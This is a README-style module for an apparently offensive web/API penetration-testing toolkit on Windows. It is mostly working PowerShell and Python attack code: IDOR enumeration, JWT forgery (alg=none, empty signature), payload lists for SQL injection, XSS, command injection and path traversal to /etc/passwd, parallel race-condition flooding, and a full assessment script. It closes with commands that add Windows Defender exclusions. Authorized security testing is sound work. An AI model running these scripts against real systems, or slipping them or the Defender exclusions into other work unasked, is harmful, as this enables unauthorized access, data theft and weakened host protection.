# CasperPro Windows Support Module

> **Enterprise Penetration Testing on Windows using PowerShell + curl + uv + Python**  
> Complete Windows-native implementation of the CasperPro stack for web/API security assessment.

## Overview

This module provides Windows-specific implementations for all CasperPro capabilities using:

- **PowerShell 7+** - Native scripting and automation
- **curl.exe** - HTTP client (built into Windows 10/11)
- **uv** - Python package manager (REQUIRED - never use pip)
- **Python 3.9+** - Cross-platform automation (managed via uv)
- **mitmproxy** - Traffic interception (Windows build)
- **Playwright** - Browser automation (Windows Chromium)

> **IMPORTANT**: All Python package management MUST use `uv`. Never use `pip` directly.

## Windows Environment Setup

### 1. Complete Installation Script

```powershell
# CasperPro Windows Installation Script
# Run as Administrator

# Check PowerShell version
if ($PSVersionTable.PSVersion.Major -lt 7) {
    Write-Host "PowerShell 7+ required. Installing..." -ForegroundColor Yellow
    winget install Microsoft.PowerShell
    Write-Host "Restart terminal and run this script again" -ForegroundColor Red
    exit
}

# Install uv (Python package manager) - REQUIRED FIRST
Write-Host "Installing uv package manager..." -ForegroundColor Cyan
winget install astral-sh.uv

# Refresh PATH
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")

# Install mitmproxy via winget
winget install mitmproxy.mitmproxy

# Install jq for JSON processing
winget install jqlang.jq

# Create project directory and initialize with uv
$projectDir = "$env:USERPROFILE\casper-pentest"
New-Item -ItemType Directory -Path $projectDir -Force
Set-Location $projectDir

# Initialize uv project
uv init

# Install Python packages with uv (NEVER use pip)
uv add mitmproxy playwright pyjwt aiohttp httpx

# Install mitmproxy as global tool
uv tool install mitmproxy

# Install Playwright browsers
uv run playwright install chromium

# Verify installations
Write-Host "`n=== Installation Verification ===" -ForegroundColor Green
$tools = @{
    "uv" = "uv --version"
    "curl" = "curl.exe --version"
    "mitmdump" = "mitmdump --version"
    "jq" = "jq --version"
}

foreach ($tool in $tools.GetEnumerator()) {
    try {
        $output = Invoke-Expression $tool.Value 2>&1 | Select-Object -First 1
        Write-Host "[OK] $($tool.Key): $output" -ForegroundColor Green
    } catch {
        Write-Host "[MISSING] $($tool.Key)" -ForegroundColor Red
    }
}

# Test uv-managed tools
Write-Host "`n=== uv-managed Tools ===" -ForegroundColor Cyan
uv run python --version
uv run playwright --version

# Optional: Install security tools
Write-Host "`n=== Installing Security Tools ===" -ForegroundColor Yellow

$toolsDir = "$env:USERPROFILE\tools"
New-Item -ItemType Directory -Path $toolsDir -Force

# nuclei
$nucleiUrl = "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_windows_amd64.zip"
Invoke-WebRequest -Uri $nucleiUrl -OutFile "$env:TEMP\nuclei.zip"
Expand-Archive -Path "$env:TEMP\nuclei.zip" -DestinationPath "$toolsDir\nuclei" -Force

# ffuf
$ffufUrl = "https://github.com/ffuf/ffuf/releases/latest/download/ffuf_windows_amd64.zip"
Invoke-WebRequest -Uri $ffufUrl -OutFile "$env:TEMP\ffuf.zip"
Expand-Archive -Path "$env:TEMP\ffuf.zip" -DestinationPath "$toolsDir\ffuf" -Force

# sqlmap (run with uv)
git clone https://github.com/sqlmapproject/sqlmap.git "$toolsDir\sqlmap"

# Add to PATH
$toolsPath = "$toolsDir\nuclei;$toolsDir\ffuf"
[Environment]::SetEnvironmentVariable("Path", $env:Path + ";$toolsPath", "User")

Write-Host "`nInstallation complete!" -ForegroundColor Green
Write-Host "Project directory: $projectDir" -ForegroundColor Cyan
Write-Host "Run scripts with: uv run script.py" -ForegroundColor Yellow
```

### 2. Environment Verification

```powershell
# Verify all tools are working
function Test-CasperProEnvironment {
    $tools = @{
        "uv" = "uv --version"
        "curl" = "curl.exe --version"
        "mitmproxy" = "mitmdump --version"
        "jq" = "jq --version"
    }
    
    # uv-managed tools
    $uvTools = @{
        "python" = "uv run python --version"
        "playwright" = "uv run playwright --version"
    }
    
    $results = @()
    
    # Check system tools
    foreach ($tool in $tools.GetEnumerator()) {
        try {
            $output = Invoke-Expression $tool.Value 2>&1
            $results += [PSCustomObject]@{
                Tool = $tool.Key
                Status = "OK"
                Version = ($output | Select-Object -First 1)
            }
        } catch {
            $results += [PSCustomObject]@{
                Tool = $tool.Key
                Status = "MISSING"
                Version = "N/A"
            }
        }
    }
    
    $results | Format-Table -AutoSize
}

Test-CasperProEnvironment
```

## PowerShell HTTP Client Functions

### 1. Advanced HTTP Request Function

```powershell
# CasperPro PowerShell HTTP Client
function Invoke-CasperRequest {
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        
        [string]$Method = "GET",
        
        [hashtable]$Headers = @{},
        
        [string]$Body,
        
        [string]$ContentType = "application/json",
        
        [string]$Proxy,
        
        [switch]$IgnoreCertErrors,
        
        [int]$Timeout = 30,
        
        [switch]$Raw
    )
    
    # Build curl command
    $curlArgs = @("-s", "-w", "`n%{http_code}", "-X", $Method)
    
    # Add headers
    $Headers["Content-Type"] = $ContentType
    foreach ($header in $Headers.GetEnumerator()) {
        $curlArgs += "-H"
        $curlArgs += "$($header.Key): $($header.Value)"
    }
    
    # Add body
    if ($Body) {
        $curlArgs += "-d"
        $curlArgs += $Body
    }
    
    # Proxy support
    if ($Proxy) {
        $curlArgs += "--proxy"
        $curlArgs += $Proxy
    }
    
    # Ignore cert errors (for mitmproxy)
    if ($IgnoreCertErrors) {
        $curlArgs += "-k"
    }
    
    # Timeout
    $curlArgs += "--max-time"
    $curlArgs += $Timeout
    
    # Add URL
    $curlArgs += $Url
    
    # Execute
    $output = & curl.exe @curlArgs 2>&1
    $lines = $output -split "`n"
    $statusCode = $lines[-1]
    $responseBody = ($lines[0..($lines.Count - 2)]) -join "`n"
    
    if ($Raw) {
        return $responseBody
    }
    
    return [PSCustomObject]@{
        StatusCode = [int]$statusCode
        Body = $responseBody
        Json = try { $responseBody | ConvertFrom-Json } catch { $null }
    }
}

# Usage examples
# $response = Invoke-CasperRequest -Url "https://api.target.com/users" -Headers @{Authorization="Bearer token"}
# $response = Invoke-CasperRequest -Url "https://api.target.com/login" -Method POST -Body '{"user":"admin","pass":"admin"}'
# $response = Invoke-CasperRequest -Url "https://target.com" -Proxy "http://127.0.0.1:8082" -IgnoreCertErrors
```

### 2. Parallel Request Function

```powershell
# Parallel HTTP requests using PowerShell jobs
function Invoke-CasperParallel {
    param(
        [Parameter(Mandatory)]
        [array]$Requests,  # Array of @{Url, Method, Headers, Body}
        
        [int]$MaxConcurrent = 10,
        
        [string]$Proxy,
        
        [switch]$IgnoreCertErrors
    )
    
    $results = [System.Collections.Concurrent.ConcurrentBag[object]]::new()
    
    $Requests | ForEach-Object -ThrottleLimit $MaxConcurrent -Parallel {
        $req = $_
        $proxyArg = $using:Proxy
        $ignoreCert = $using:IgnoreCertErrors
        
        $curlArgs = @("-s", "-w", "|%{http_code}|%{time_total}", "-X", ($req.Method ?? "GET"))
        
        if ($req.Headers) {
            foreach ($h in $req.Headers.GetEnumerator()) {
                $curlArgs += @("-H", "$($h.Key): $($h.Value)")
            }
        }
        
        if ($req.Body) {
            $curlArgs += @("-d", $req.Body)
        }
        
        if ($proxyArg) {
            $curlArgs += @("--proxy", $proxyArg)
        }
        
        if ($ignoreCert) {
            $curlArgs += "-k"
        }
        
        $curlArgs += $req.Url
        
        $output = & curl.exe @curlArgs 2>&1
        $parts = $output -split "\|"
        
        [PSCustomObject]@{
            Url = $req.Url
            StatusCode = $parts[-2]
            ResponseTime = $parts[-1]
            Body = ($parts[0..($parts.Count - 3)]) -join "|"
        }
    }
}

# Usage: Test IDOR with parallel requests
$requests = 1..100 | ForEach-Object {
    @{
        Url = "https://api.target.com/users/$_"
        Method = "GET"
        Headers = @{Authorization = "Bearer $token"}
    }
}
$results = Invoke-CasperParallel -Requests $requests -MaxConcurrent 20
$results | Where-Object { $_.StatusCode -eq 200 } | Format-Table
```

## Windows mitmproxy Integration

### 1. Start mitmproxy with PowerShell

```powershell
# Start mitmproxy as background job
function Start-CasperProxy {
    param(
        [int]$Port = 8082,
        [string]$AddonScript,
        [string]$OutputFile = "$env:TEMP\casper_traffic.json"
    )
    
    # Create default capture addon if not specified
    if (-not $AddonScript) {
        $AddonScript = "$env:TEMP\casper_addon.py"
        @"
import json
import mitmproxy.http

class CaptureAddon:
    def __init__(self):
        self.requests = []
        self.output_file = r"$OutputFile"
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        req_data = {
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "headers": dict(flow.request.headers),
            "body": flow.request.get_text() if flow.request.content else None
        }
        self.requests.append(req_data)
        
        with open(self.output_file, "w") as f:
            json.dump(self.requests, f, indent=2)

addons = [CaptureAddon()]
"@ | Out-File -FilePath $AddonScript -Encoding utf8
    }
    
    # Start mitmproxy as job
    $job = Start-Job -ScriptBlock {
        param($port, $addon)
        & mitmdump -p $port --set block_global=false -s $addon
    } -ArgumentList $Port, $AddonScript
    
    Write-Host "mitmproxy started on port $Port (Job ID: $($job.Id))" -ForegroundColor Green
    Write-Host "Traffic captured to: $OutputFile" -ForegroundColor Yellow
    
    return $job
}

# Stop mitmproxy
function Stop-CasperProxy {
    param([int]$JobId)
    Stop-Job -Id $JobId
    Remove-Job -Id $JobId
    Write-Host "mitmproxy stopped" -ForegroundColor Yellow
}

# Usage
$proxyJob = Start-CasperProxy -Port 8082
# ... do testing ...
Stop-CasperProxy -JobId $proxyJob.Id
```

### 2. Analyze Captured Traffic

```powershell
# Analyze mitmproxy captured traffic
function Get-CasperTraffic {
    param(
        [string]$TrafficFile = "$env:TEMP\casper_traffic.json"
    )
    
    if (-not (Test-Path $TrafficFile)) {
        Write-Host "No traffic file found" -ForegroundColor Red
        return
    }
    
    $traffic = Get-Content $TrafficFile | ConvertFrom-Json
    
    # Analysis
    $analysis = [PSCustomObject]@{
        TotalRequests = $traffic.Count
        UniqueUrls = ($traffic.url | Select-Object -Unique).Count
        Methods = $traffic | Group-Object method | Select-Object Name, Count
        ApiEndpoints = $traffic | Where-Object { $_.url -match "/api/|/v\d/|graphql" }
        AuthHeaders = $traffic | Where-Object { 
            $_.headers.PSObject.Properties.Name -match "auth|token|cookie" 
        }
    }
    
    Write-Host "`n=== Traffic Analysis ===" -ForegroundColor Cyan
    Write-Host "Total Requests: $($analysis.TotalRequests)"
    Write-Host "Unique URLs: $($analysis.UniqueUrls)"
    Write-Host "`nMethods:" -ForegroundColor Yellow
    $analysis.Methods | Format-Table
    
    Write-Host "`nAPI Endpoints Found: $($analysis.ApiEndpoints.Count)" -ForegroundColor Yellow
    $analysis.ApiEndpoints | Select-Object -First 10 -ExpandProperty url
    
    Write-Host "`nRequests with Auth Headers: $($analysis.AuthHeaders.Count)" -ForegroundColor Yellow
    
    return $analysis
}
```

## Windows Playwright Integration

### 1. Browser Automation Script

```powershell
# Run Playwright discovery via Python
function Invoke-CasperDiscovery {
    param(
        [Parameter(Mandatory)]
        [string]$Target,
        
        [string]$Username,
        [string]$Password,
        
        [int]$ProxyPort = 8082,
        
        [switch]$Headless,
        
        [string]$OutputDir = "$env:TEMP\casper_discovery"
    )
    
    # Ensure output directory exists
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    
    # Create Python discovery script
    $pythonScript = @"
import sys
sys.stdout.reconfigure(encoding='utf-8')

from playwright.sync_api import sync_playwright
import json
import os

TARGET = "$Target"
USERNAME = "$Username"
PASSWORD = "$Password"
PROXY_PORT = $ProxyPort
HEADLESS = $($Headless.ToString().ToLower())
OUTPUT_DIR = r"$OutputDir"

def discover():
    with sync_playwright() as p:
        browser = p.chromium.launch(
            proxy={"server": f"http://127.0.0.1:{PROXY_PORT}"},
            headless=HEADLESS
        )
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        
        discovered = {
            "urls": [],
            "forms": [],
            "apis": [],
            "cookies": [],
            "storage": {}
        }
        
        # Navigate to target
        print(f"[*] Navigating to {TARGET}")
        page.goto(TARGET)
        page.wait_for_load_state("networkidle")
        
        # Login if credentials provided
        if USERNAME and PASSWORD:
            print("[*] Attempting login...")
            # Try common login selectors
            selectors = [
                ('input[name="email"]', 'input[name="password"]'),
                ('input[name="username"]', 'input[name="password"]'),
                ('input[type="email"]', 'input[type="password"]'),
                ('#email', '#password'),
                ('#username', '#password'),
            ]
            
            for user_sel, pass_sel in selectors:
                try:
                    if page.query_selector(user_sel) and page.query_selector(pass_sel):
                        page.fill(user_sel, USERNAME)
                        page.fill(pass_sel, PASSWORD)
                        page.click('button[type="submit"]')
                        page.wait_for_load_state("networkidle")
                        print("[+] Login submitted")
                        break
                except:
                    continue
        
        # Discover links
        print("[*] Discovering links...")
        links = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
        discovered["urls"] = list(set([l for l in links if TARGET.split("//")[1].split("/")[0] in l]))
        print(f"[+] Found {len(discovered['urls'])} unique URLs")
        
        # Discover forms
        print("[*] Discovering forms...")
        forms = page.eval_on_selector_all("form", '''forms => forms.map(f => ({
            action: f.action,
            method: f.method,
            inputs: Array.from(f.querySelectorAll("input")).map(i => ({
                name: i.name,
                type: i.type,
                id: i.id
            }))
        }))''')
        discovered["forms"] = forms
        print(f"[+] Found {len(forms)} forms")
        
        # Get cookies
        discovered["cookies"] = context.cookies()
        
        # Get localStorage
        discovered["storage"]["localStorage"] = page.evaluate("() => JSON.stringify(localStorage)")
        discovered["storage"]["sessionStorage"] = page.evaluate("() => JSON.stringify(sessionStorage)")
        
        # Visit discovered URLs
        print("[*] Crawling discovered URLs...")
        for url in discovered["urls"][:20]:
            try:
                page.goto(url, timeout=5000)
                page.wait_for_load_state("networkidle", timeout=3000)
            except:
                pass
        
        # Screenshot
        page.screenshot(path=os.path.join(OUTPUT_DIR, "screenshot.png"))
        
        # Save discovery results
        with open(os.path.join(OUTPUT_DIR, "discovery.json"), "w") as f:
            json.dump(discovered, f, indent=2, default=str)
        
        browser.close()
        print(f"[+] Discovery complete. Results saved to {OUTPUT_DIR}")
        return discovered

if __name__ == "__main__":
    discover()
"@
    
    $scriptPath = "$env:TEMP\casper_discover.py"
    $pythonScript | Out-File -FilePath $scriptPath -Encoding utf8
    
    Write-Host "Starting Playwright discovery..." -ForegroundColor Cyan
    python $scriptPath
    
    # Load and return results
    $resultsPath = Join-Path $OutputDir "discovery.json"
    if (Test-Path $resultsPath) {
        return Get-Content $resultsPath | ConvertFrom-Json
    }
}

# Usage
# $discovery = Invoke-CasperDiscovery -Target "https://target.com" -Username "test" -Password "test123"
```

## Windows Security Testing Functions

### 1. IDOR Testing

```powershell
function Test-CasperIDOR {
    param(
        [Parameter(Mandatory)]
        [string]$BaseUrl,  # e.g., "https://api.target.com/users/{id}"
        
        [Parameter(Mandatory)]
        [string]$Token,
        
        [int]$StartId = 1,
        [int]$EndId = 100,
        
        [string]$Proxy
    )
    
    $findings = @()
    
    Write-Host "Testing IDOR: $BaseUrl" -ForegroundColor Cyan
    Write-Host "Range: $StartId - $EndId" -ForegroundColor Yellow
    
    $StartId..$EndId | ForEach-Object -ThrottleLimit 10 -Parallel {
        $id = $_
        $url = $using:BaseUrl -replace "\{id\}", $id
        $token = $using:Token
        $proxy = $using:Proxy
        
        $curlArgs = @("-s", "-o", "NUL", "-w", "%{http_code}", "-H", "Authorization: Bearer $token")
        if ($proxy) { $curlArgs += @("--proxy", $proxy, "-k") }
        $curlArgs += $url
        
        $status = & curl.exe @curlArgs
        
        if ($status -eq "200") {
            [PSCustomObject]@{
                Id = $id
                Url = $url
                Status = $status
                Vulnerable = $true
            }
        }
    } | ForEach-Object {
        if ($_.Vulnerable) {
            Write-Host "[VULN] ID $($_.Id) accessible - Status: $($_.Status)" -ForegroundColor Red
            $findings += $_
        }
    }
    
    Write-Host "`nTotal IDOR findings: $($findings.Count)" -ForegroundColor $(if ($findings.Count -gt 0) { "Red" } else { "Green" })
    return $findings
}

# Usage
# $idorResults = Test-CasperIDOR -BaseUrl "https://api.target.com/users/{id}" -Token "eyJ..." -StartId 1 -EndId 100
```

### 2. JWT Attack Testing

```powershell
function Test-CasperJWT {
    param(
        [Parameter(Mandatory)]
        [string]$Token,
        
        [Parameter(Mandatory)]
        [string]$TestUrl,
        
        [string]$Proxy
    )
    
    # Decode JWT
    function Decode-JWT {
        param([string]$jwt)
        $parts = $jwt.Split(".")
        $header = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($parts[0].Replace("-","+").Replace("_","/").PadRight(4 * [Math]::Ceiling($parts[0].Length / 4), "=")))
        $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($parts[1].Replace("-","+").Replace("_","/").PadRight(4 * [Math]::Ceiling($parts[1].Length / 4), "=")))
        return @{
            Header = $header | ConvertFrom-Json
            Payload = $payload | ConvertFrom-Json
            Raw = @{Header = $parts[0]; Payload = $parts[1]; Signature = $parts[2]}
        }
    }
    
    # Create forged tokens
    function Forge-JWT {
        param(
            [hashtable]$Payload,
            [string]$Algorithm = "none"
        )
        $header = @{alg = $Algorithm; typ = "JWT"} | ConvertTo-Json -Compress
        $payloadJson = $Payload | ConvertTo-Json -Compress
        
        $headerB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($header)).TrimEnd("=").Replace("+","-").Replace("/","_")
        $payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadJson)).TrimEnd("=").Replace("+","-").Replace("/","_")
        
        return "$headerB64.$payloadB64."
    }
    
    Write-Host "=== JWT Security Testing ===" -ForegroundColor Cyan
    
    # Decode original token
    $decoded = Decode-JWT -jwt $Token
    Write-Host "`nOriginal Token:" -ForegroundColor Yellow
    Write-Host "Header: $($decoded.Header | ConvertTo-Json -Compress)"
    Write-Host "Payload: $($decoded.Payload | ConvertTo-Json -Compress)"
    
    $findings = @()
    
    # Test 1: Algorithm None
    Write-Host "`n[Test 1] Algorithm None Attack..." -ForegroundColor Yellow
    $payload = $decoded.Payload | ConvertTo-Json | ConvertFrom-Json
    $forgedNone = Forge-JWT -Payload ($payload | Get-Member -MemberType NoteProperty | ForEach-Object { @{$_.Name = $payload.($_.Name)} } | ForEach-Object { $result = @{} } { $result += $_ } { $result })
    
    $curlArgs = @("-s", "-H", "Authorization: Bearer $forgedNone")
    if ($Proxy) { $curlArgs += @("--proxy", $Proxy, "-k") }
    $curlArgs += $TestUrl
    
    $response = & curl.exe @curlArgs
    if ($response -notmatch "unauthorized|invalid|expired" -and $response.Length -gt 10) {
        Write-Host "[VULN] Algorithm None bypass successful!" -ForegroundColor Red
        $findings += @{Attack = "Algorithm None"; Token = $forgedNone; Response = $response.Substring(0, [Math]::Min(100, $response.Length))}
    } else {
        Write-Host "[SAFE] Algorithm None rejected" -ForegroundColor Green
    }
    
    # Test 2: Empty signature
    Write-Host "`n[Test 2] Empty Signature..." -ForegroundColor Yellow
    $emptySignature = "$($decoded.Raw.Header).$($decoded.Raw.Payload)."
    
    $curlArgs = @("-s", "-H", "Authorization: Bearer $emptySignature")
    if ($Proxy) { $curlArgs += @("--proxy", $Proxy, "-k") }
    $curlArgs += $TestUrl
    
    $response = & curl.exe @curlArgs
    if ($response -notmatch "unauthorized|invalid|expired" -and $response.Length -gt 10) {
        Write-Host "[VULN] Empty signature accepted!" -ForegroundColor Red
        $findings += @{Attack = "Empty Signature"; Token = $emptySignature}
    } else {
        Write-Host "[SAFE] Empty signature rejected" -ForegroundColor Green
    }
    
    # Test 3: Expired token modification
    Write-Host "`n[Test 3] Expiry Manipulation..." -ForegroundColor Yellow
    $modifiedPayload = $decoded.Payload | ConvertTo-Json | ConvertFrom-Json
    $modifiedPayload.exp = [int][double]::Parse((Get-Date).AddYears(10).ToUniversalTime().Subtract([datetime]'1970-01-01').TotalSeconds.ToString())
    
    Write-Host "Modified exp to: $($modifiedPayload.exp)"
    
    return @{
        DecodedToken = $decoded
        Findings = $findings
    }
}

# Usage
# $jwtResults = Test-CasperJWT -Token "eyJ..." -TestUrl "https://api.target.com/protected"
```

### 3. Injection Testing

```powershell
function Test-CasperInjection {
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        
        [string]$Method = "GET",
        
        [string]$Parameter,  # Parameter to inject into
        
        [hashtable]$Headers = @{},
        
        [string]$Proxy,
        
        [switch]$AllPayloads
    )
    
    $payloads = @{
        SQLi = @(
            "'"
            "1' OR '1'='1"
            "1' OR '1'='1'--"
            "1' UNION SELECT NULL--"
            "1'; WAITFOR DELAY '0:0:5'--"
            "1' AND SLEEP(5)#"
        )
        XSS = @(
            "<script>alert(1)</script>"
            "javascript:alert(1)"
            "<img src=x onerror=alert(1)>"
            "{{7*7}}"
            "${7*7}"
        )
        CommandInjection = @(
            "; id"
            "| id"
            "`$(id)"
            "; whoami"
            "| type C:\Windows\System32\drivers\etc\hosts"
        )
        SSTI = @(
            "{{7*7}}"
            "${7*7}"
            "<%= 7*7 %>"
            "#{7*7}"
            "{7*7}"
        )
        PathTraversal = @(
            "../../../etc/passwd"
            "..\..\..\..\windows\system32\drivers\etc\hosts"
            "....//....//....//etc/passwd"
        )
    }
    
    $findings = @()
    $indicators = @{
        SQLi = @("sql", "syntax", "mysql", "postgresql", "sqlite", "oracle", "odbc", "error")
        XSS = @("<script>", "alert(1)", "49")
        CommandInjection = @("uid=", "gid=", "root", "Administrator", "127.0.0.1")
        SSTI = @("49", "7777777")
        PathTraversal = @("root:", "localhost", "password")
    }
    
    Write-Host "=== Injection Testing ===" -ForegroundColor Cyan
    Write-Host "URL: $Url" -ForegroundColor Yellow
    Write-Host "Parameter: $Parameter" -ForegroundColor Yellow
    
    foreach ($category in $payloads.Keys) {
        $testPayloads = if ($AllPayloads) { $payloads[$category] } else { $payloads[$category] | Select-Object -First 2 }
        
        Write-Host "`n[$category Testing]" -ForegroundColor Cyan
        
        foreach ($payload in $testPayloads) {
            # Build test URL
            $encodedPayload = [System.Web.HttpUtility]::UrlEncode($payload)
            $testUrl = if ($Parameter) {
                if ($Url -match "\?") {
                    "$Url&$Parameter=$encodedPayload"
                } else {
                    "$Url?$Parameter=$encodedPayload"
                }
            } else {
                $Url + $encodedPayload
            }
            
            $curlArgs = @("-s", "-X", $Method)
            foreach ($h in $Headers.GetEnumerator()) {
                $curlArgs += @("-H", "$($h.Key): $($h.Value)")
            }
            if ($Proxy) { $curlArgs += @("--proxy", $Proxy, "-k") }
            $curlArgs += $testUrl
            
            $response = & curl.exe @curlArgs 2>&1
            
            # Check for vulnerability indicators
            $vulnFound = $false
            foreach ($indicator in $indicators[$category]) {
                if ($response -match $indicator) {
                    Write-Host "[VULN] $category detected with payload: $payload" -ForegroundColor Red
                    Write-Host "       Indicator: $indicator" -ForegroundColor Red
                    $findings += @{
                        Category = $category
                        Payload = $payload
                        Url = $testUrl
                        Indicator = $indicator
                        Response = $response.Substring(0, [Math]::Min(200, $response.Length))
                    }
                    $vulnFound = $true
                    break
                }
            }
            
            if (-not $vulnFound) {
                Write-Host "[OK] $payload" -ForegroundColor DarkGray
            }
        }
    }
    
    Write-Host "`n=== Summary ===" -ForegroundColor Cyan
    Write-Host "Total findings: $($findings.Count)" -ForegroundColor $(if ($findings.Count -gt 0) { "Red" } else { "Green" })
    
    return $findings
}

# Usage
# $injectionResults = Test-CasperInjection -Url "https://target.com/search" -Parameter "q" -AllPayloads
```

### 4. Race Condition Testing

```powershell
function Test-CasperRaceCondition {
    param(
        [Parameter(Mandatory)]
        [string]$Url,
        
        [string]$Method = "POST",
        
        [string]$Body,
        
        [hashtable]$Headers = @{},
        
        [int]$Threads = 20,
        
        [string]$Proxy
    )
    
    Write-Host "=== Race Condition Testing ===" -ForegroundColor Cyan
    Write-Host "URL: $Url" -ForegroundColor Yellow
    Write-Host "Threads: $Threads" -ForegroundColor Yellow
    
    $scriptBlock = {
        param($url, $method, $body, $headers, $proxy)
        
        $curlArgs = @("-s", "-w", "|%{http_code}", "-X", $method)
        foreach ($h in $headers.GetEnumerator()) {
            $curlArgs += @("-H", "$($h.Key): $($h.Value)")
        }
        if ($body) { $curlArgs += @("-d", $body) }
        if ($proxy) { $curlArgs += @("--proxy", $proxy, "-k") }
        $curlArgs += $url
        
        $output = & curl.exe @curlArgs 2>&1
        $parts = $output -split "\|"
        
        @{
            Response = $parts[0]
            StatusCode = $parts[-1]
            Timestamp = Get-Date -Format "HH:mm:ss.fff"
        }
    }
    
    # Launch parallel requests
    $jobs = @()
    $start = Get-Date
    
    1..$Threads | ForEach-Object {
        $jobs += Start-Job -ScriptBlock $scriptBlock -ArgumentList $Url, $Method, $Body, $Headers, $Proxy
    }
    
    # Wait for all jobs
    $results = $jobs | Wait-Job | Receive-Job
    $elapsed = (Get-Date) - $start
    
    # Cleanup
    $jobs | Remove-Job
    
    # Analyze results
    $successCount = ($results | Where-Object { $_.StatusCode -eq "200" -or $_.StatusCode -eq "201" }).Count
    
    Write-Host "`n=== Results ===" -ForegroundColor Cyan
    Write-Host "Total requests: $Threads"
    Write-Host "Elapsed time: $($elapsed.TotalSeconds.ToString('0.00'))s"
    Write-Host "Successful responses: $successCount" -ForegroundColor $(if ($successCount -gt 1) { "Red" } else { "Green" })
    
    if ($successCount -gt 1) {
        Write-Host "`n[VULN] RACE CONDITION DETECTED!" -ForegroundColor Red
        Write-Host "Multiple successful responses indicate the operation was executed $successCount times" -ForegroundColor Red
    }
    
    return @{
        TotalRequests = $Threads
        SuccessfulResponses = $successCount
        ElapsedSeconds = $elapsed.TotalSeconds
        Vulnerable = $successCount -gt 1
        Results = $results
    }
}

# Usage
# $raceResults = Test-CasperRaceCondition -Url "https://api.target.com/redeem" -Method POST -Body '{"coupon":"DISCOUNT50"}' -Headers @{Authorization="Bearer token"}
```

## Complete Windows Assessment Script

```powershell
# CasperPro Complete Windows Assessment
# Usage: .\casper-assess.ps1 -Target "https://target.com" -Token "Bearer eyJ..."

param(
    [Parameter(Mandatory)]
    [string]$Target,
    
    [string]$Token,
    
    [string]$Username,
    [string]$Password,
    
    [switch]$UseProxy,
    [int]$ProxyPort = 8082,
    
    [string]$OutputDir = "$env:USERPROFILE\casper_output"
)

# Create output directory
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$reportFile = Join-Path $OutputDir "report_$timestamp.json"

Write-Host @"
 ██████╗ █████╗ ███████╗██████╗ ███████╗██████╗ ██████╗ ██████╗  ██████╗ 
██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
██║     ███████║███████╗██████╔╝█████╗  ██████╔╝██████╔╝██████╔╝██║   ██║
██║     ██╔══██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╝██╔═══╝ ██╔══██╗██║   ██║
╚██████╗██║  ██║███████║██║     ███████╗██║  ██║██║     ██║  ██║╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
                    Windows Edition v2.1
"@ -ForegroundColor Cyan

$report = @{
    Target = $Target
    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Findings = @()
}

# Phase 1: Discovery
Write-Host "`n[Phase 1] Discovery" -ForegroundColor Cyan
if ($UseProxy) {
    $proxyJob = Start-CasperProxy -Port $ProxyPort
    Start-Sleep -Seconds 2
}

$discovery = Invoke-CasperDiscovery -Target $Target -Username $Username -Password $Password -ProxyPort $ProxyPort -Headless
$report.Discovery = $discovery

# Phase 2: API Endpoint Testing
Write-Host "`n[Phase 2] API Endpoint Testing" -ForegroundColor Cyan
if ($discovery.urls) {
    $apiUrls = $discovery.urls | Where-Object { $_ -match "/api/|/v\d/" }
    Write-Host "Found $($apiUrls.Count) API endpoints"
}

# Phase 3: Security Testing
Write-Host "`n[Phase 3] Security Testing" -ForegroundColor Cyan

# IDOR Testing
if ($Token -and $apiUrls) {
    $idorUrl = $apiUrls | Where-Object { $_ -match "/\d+" } | Select-Object -First 1
    if ($idorUrl) {
        $idorUrl = $idorUrl -replace "/\d+", "/{id}"
        $idorResults = Test-CasperIDOR -BaseUrl $idorUrl -Token $Token -StartId 1 -EndId 20
        $report.Findings += $idorResults
    }
}

# Injection Testing
$injectionResults = Test-CasperInjection -Url "$Target/search" -Parameter "q"
$report.Findings += $injectionResults

# JWT Testing
if ($Token -match "^eyJ") {
    $jwtResults = Test-CasperJWT -Token $Token -TestUrl "$Target/api/profile"
    $report.Findings += $jwtResults.Findings
}

# Phase 4: Reporting
Write-Host "`n[Phase 4] Generating Report" -ForegroundColor Cyan

$report | ConvertTo-Json -Depth 10 | Out-File $reportFile -Encoding utf8

$criticalCount = ($report.Findings | Where-Object { $_.Category -in @("SQLi", "CommandInjection") }).Count
$highCount = ($report.Findings | Where-Object { $_.Category -in @("IDOR", "XSS") }).Count

Write-Host "`n=== Assessment Complete ===" -ForegroundColor Green
Write-Host "Target: $Target"
Write-Host "Critical: $criticalCount" -ForegroundColor Red
Write-Host "High: $highCount" -ForegroundColor Yellow
Write-Host "Report: $reportFile"

# Cleanup
if ($UseProxy) {
    Stop-CasperProxy -JobId $proxyJob.Id
}
```

## Windows-Specific Tips

### 1. Execution Policy

```powershell
# Allow script execution (run as Administrator)
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

### 2. Proxy Certificate Trust

```powershell
# Install mitmproxy CA certificate
# 1. Start mitmproxy: mitmdump -p 8082
# 2. Navigate to http://mitm.it in browser through proxy
# 3. Download and install Windows certificate
# 4. Or use -k flag with curl to ignore cert errors
```

### 3. Windows Defender Exclusions

```powershell
# Add exclusions for security tools (run as Administrator)
Add-MpPreference -ExclusionPath "$env:USERPROFILE\tools"
Add-MpPreference -ExclusionProcess "nuclei.exe"
